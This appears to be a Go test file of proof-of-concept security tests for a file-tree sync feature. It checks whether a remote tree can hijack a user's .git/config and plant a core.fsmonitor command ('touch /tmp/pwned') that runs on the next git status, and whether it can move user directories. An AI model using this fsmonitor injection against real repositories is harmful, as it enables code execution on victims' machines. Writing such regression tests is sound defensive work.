package project

import (
	"bytes"
	"testing"
)

// PoC: a remote tree can (1) adopt an existing user file it never created,
// (2) move it away, (3) then plant attacker content at its old path.
// Target: .git/config (core.fsmonitor = RCE on next `git status`).
func TestPoCTreeHijacksGitConfig(t *testing.T) {
	base := newBase(t)
	p := create(t, base, "p")
	if err := base.MkdirAll("p/.git", 0o700); err != nil {
		t.Fatal(err)
	}
	orig := []byte("[core]\n\trepositoryformatversion = 0\n")
	if err := base.WriteFile("p/.git/config", orig, 0o600); err != nil {
		t.Fatal(err)
	}
	// 1. adopt the user's file under any hash.
	h1 := blobEntry(".git/config", []byte("whatever"))
	if r, err := p.ApplyTree([]TreeEntry{h1}); err != nil {
		t.Fatal(err)
	} else if len(r.Rejected) != 0 {
		return // refused outright: the user's file is out of reach
	}
	// 2. same hash elsewhere: moveRenamed renames the user's real file.
	moved := h1
	moved.Path = "junk"
	if _, err := p.ApplyTree([]TreeEntry{moved}); err != nil {
		t.Fatal(err)
	}
	if got, _ := base.ReadFile("p/junk"); !bytes.Equal(got, orig) {
		t.Fatalf("user file not moved: %q", got)
	}
	// 3. plant hostile content at the now-free path.
	evil := []byte("[core]\n\tfsmonitor = \"touch /tmp/pwned; false\"\n")
	e := blobEntry(".git/config", evil)
	if _, err := p.ApplyTree([]TreeEntry{moved, e}); err != nil {
		t.Fatal(err)
	}
	if err := p.WriteBlob(e.Path, e.Hash, bytes.NewReader(evil)); err == nil {
		t.Error("VULN: WriteBlob accepted a path the tree must have refused")
	}
	got, _ := base.ReadFile("p/.git/config")
	t.Logf("p/.git/config now = %q", got)
	if bytes.Equal(got, evil) {
		t.Error("VULN: remote tree replaced .git/config with attacker content")
	}
}

// PoC: a whole directory can be moved by listing it as a blob.
func TestPoCTreeMovesDirectory(t *testing.T) {
	base := newBase(t)
	p := create(t, base, "p")
	_ = base.MkdirAll("p/thesis/chapters", 0o700)
	_ = base.WriteFile("p/thesis/chapters/1.typ", []byte("x"), 0o600)
	a := blobEntry("thesis", []byte("x"))
	if _, err := p.ApplyTree([]TreeEntry{a}); err != nil {
		t.Fatal(err)
	}
	b := a
	b.Path = "gone"
	_, _ = p.ApplyTree([]TreeEntry{b})
	if _, err := base.Stat("p/gone/chapters/1.typ"); err == nil {
		t.Error("VULN: remote tree moved a user directory it never owned")
	}
}
